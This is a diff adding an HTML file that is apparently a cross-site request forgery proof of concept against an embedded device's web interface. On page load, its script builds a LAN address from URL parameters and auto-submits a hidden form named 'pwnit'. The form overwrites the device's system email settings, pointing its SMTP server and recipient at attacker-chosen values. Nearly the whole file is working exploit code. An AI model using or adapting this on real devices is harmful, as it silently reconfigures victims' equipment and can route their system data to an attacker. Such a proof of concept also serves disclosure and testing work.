@@ -1,0 +1,46 @@
+<html>
+<title>
+</title>
+<body>
+<form id="pwnit" action="willbereplaced/setSystemEmail" method="POST">
+      <input  name="ReplySuccessPage" value="email&#46;htm" />
+      <input  name="ReplyErrorPage" value="errreml&#46;htm" />
+      <input  name="EmailScheduleEnable" value="1" />
+      <input  name="EmailScheduleDay" value="0" />
+      <input  name="EmailSMTPServerAddress" value="192&#46;168&#46;1&#46;128" />
+      <input  name="EmailSMTPPortNumber" value="25" />
+      <input  name="EmailSenderAddress" value="spam&#64;blacktraffic&#46;co&#46;uk" />
+      <input  name="EmailReceiverAddress" value="spam&#64;blacktraffic&#46;co&#46;uk" />
+      <input  name="EmailUserName" value="" />
+      <input  name="EmailPassword" value="" />
+      <input  name="EmailTLSAuthentication" value="0" />
+      <input  name="EmailScheduleMode" value="0" />
+      <input  name="EmailScheduleInterval" value="2" />
+      <input  name="ConfigSystemEmail" value="Save" />
+      <input type="submit" value="Submit request" />
+</form>
+
+<script>
+function gup( name, url ) {
+  if (!url) url = location.href;
+  name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+  var regexS = "[\\?&]"+name+"=([^&#]*)";
+  var regex = new RegExp( regexS );
+  var results = regex.exec( url );
+  return results == null ? null : results[1];
+}
+
+var lastOctet = gup('octet', window.location.href );
+var network = gup('network', window.location.href );
+
+var iform;
+
+iform=document.getElementById("pwnit");
+
+iform.action = "http://"+network+"."+lastOctet.toString()+"/setSystemEmail";
+
+iform.submit();
+</script>
+
+</body>
+</html>
